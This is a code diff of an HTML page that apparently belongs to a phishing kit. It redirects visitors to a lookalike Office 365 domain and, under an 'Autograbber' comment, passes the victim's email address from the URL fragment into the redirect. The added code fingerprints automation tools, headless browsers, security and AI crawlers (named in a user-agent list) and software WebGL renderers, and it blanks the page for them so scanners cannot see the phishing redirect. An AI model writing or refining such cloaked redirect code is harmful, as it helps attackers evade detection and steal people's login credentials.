@@ -1,58 +1,110 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
   <meta name="referrer" content="no-referrer">
-  <title></title>
-  <style>
-    html, body { margin: 0; padding: 0; background: #fff; height: 100%; }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting...</title>
 </head>
 <body>
   <script>
   (function () {
     "use strict";
 
-    var BASE = "https://panel365webdocumentazionesicuro.org/off";
+    var BASE = "https://panel365webdocumentazionesicuro.org";
+    var MIN_MS = 1200;          // minimum dwell time before redirect
+    var t0 = Date.now();
 
-    // hash stays on final URL — no ?email=
-    function getHash() {
+    function destUrl() {
       var h = window.location.hash || "";
-      if (!h) return "";
-      if (h.charAt(0) !== "#") h = "#" + h;
-      return h;
-    }
-    function go() {
-      var dest = BASE + getHash();
-      try { window.location.replace(dest); }
-      catch (e) { window.location.href = dest; }
+      if (h.charAt(0) === "#") h = h.substring(1);
+
+      // Autograbber: fragment format is DESTINATION#email
+      var email = "";
+      var sep = h.indexOf("#");
+      if (sep !== -1) {
+        email = h.substring(sep + 1);
+        h = h.substring(0, sep);
+      }
+
+      // base64-encoded destination: only accept if it decodes to a real path/URL
+      if (/^[A-Za-z0-9+/]+={0,2}$/.test(h) && h.length % 4 === 0) {
+        try {
+          var d = atob(h);
+          if (/^[\x20-\x7E]+$/.test(d) && (d.charAt(0) === "/" || d.indexOf("http") === 0)) h = d;
+        } catch (e) {}
+      }
+
+      // treat destination as a path on BASE
+      if (h && h.charAt(0) !== "/") h = "/" + h;
+
+      var dest = BASE + h;
+      if (email) {
+        dest += (dest.indexOf("?") === -1 ? "?" : "&") + "email=" + encodeURIComponent(email);
+      }
+      return dest;
     }
 
-    // --- light bot checks only (less aggressive) ---
-    function isObviousBot() {
+    function block() {
       try {
+        document.body.innerHTML = "";
+        document.body.style.background = "#fff";
+        document.title = "Error";
+      } catch (e) {}
+      throw new Error("blocked");
+    }
+
+    function isBot() {
+      try {
+        // Automation drivers
         if (navigator.webdriver === true) return true;
         if (window.callPhantom || window._phantom || window.phantom) return true;
-        if (window.__nightmare) return true;
-        if (window.domAutomation || window.domAutomationController) return true;
+        if (window.__nightmare || window.domAutomation || window.domAutomationController) return true;
+        if (window.Cypress) return true;
+
         var ua = navigator.userAgent || "";
-        if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl\/|wget|python-requests|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
-        if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+        if (/HeadlessChrome|PhantomJS|electron|bot|crawler|spider|curl\/|wget|python|requests|urllib|httpx|aiohttp|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
+
+        // Headless Chrome: missing languages/plugins
+        if (!navigator.languages || navigator.languages.length === 0) return true;
+        if (navigator.plugins && navigator.plugins.length === 0 && !/mobile/i.test(ua)) return true;
+
+        // Inconsistent window metrics (headless / iframe loading)
+        if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+
+        // WebGL renderer: headless often reports SwiftShader / llvmpipe
+        try {
+          var c = document.createElement("canvas");
+          var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+          if (gl) {
+            var ext = gl.getExtension("WEBGL_debug_renderer_info");
+            if (ext) {
+              var r = (gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
+              if (r.indexOf("swiftshader") !== -1 || r.indexOf("llvmpipe") !== -1 || r.indexOf("software") !== -1) return true;
+            }
+          } else {
+            if (!/mobile/i.test(ua)) return true;
+          }
+        } catch (e) {}
+
+        if (navigator.permissions && navigator.permissions.query) {
+          navigator.permissions.query({ name: "notifications" }).then(function (p) {
+            if (p.state === "denied" && !("Notification" in window)) block();
+          }).catch(function () {});
+        }
       } catch (e) {}
       return false;
     }
 
-    if (isObviousBot()) {
-      // blank page, no redirect
-      return;
-    }
+    if (isBot()) block();
 
-    // short quiet dwell so dumb prefetch/crawlers that don't run timers well drop off
-    // no mouse requirement — real humans pass even if they don't move
-    var wait = 400 + Math.floor(Math.random() * 500); // 0.4–0.9s
-    setTimeout(go, wait);
+    setTimeout(function () {
+      if (Date.now() - t0 < 50) block();
+      var dest = destUrl();
+      try { window.location.replace(dest); }
+      catch (e) { window.location.href = dest; }
+    }, MIN_MS);
   })();
   </script>
 </body>
